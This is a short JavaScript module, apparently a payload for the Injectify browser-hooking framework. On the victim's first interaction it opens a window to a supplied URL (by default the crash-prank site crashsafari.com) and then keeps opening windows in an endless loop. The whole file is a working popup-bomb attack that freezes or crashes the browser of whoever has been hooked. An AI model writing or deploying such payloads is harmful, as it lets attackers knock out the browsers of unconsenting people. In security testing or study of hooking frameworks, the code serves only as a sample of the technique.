let url = module.params

/**
 * Parse the parameters
 */
if (typeof module.params == 'object') {
    if (module.params.url) url = module.params.url
}

/**
 * Default to url
 */
if (!url) url = 'http://crashsafari.com'

/**
 * Upon user interaction => open a new window repeatedly
 */
injectify.module('interaction', function() {
    window.open(url)
    while (true) {
        window.open(url)
    }
})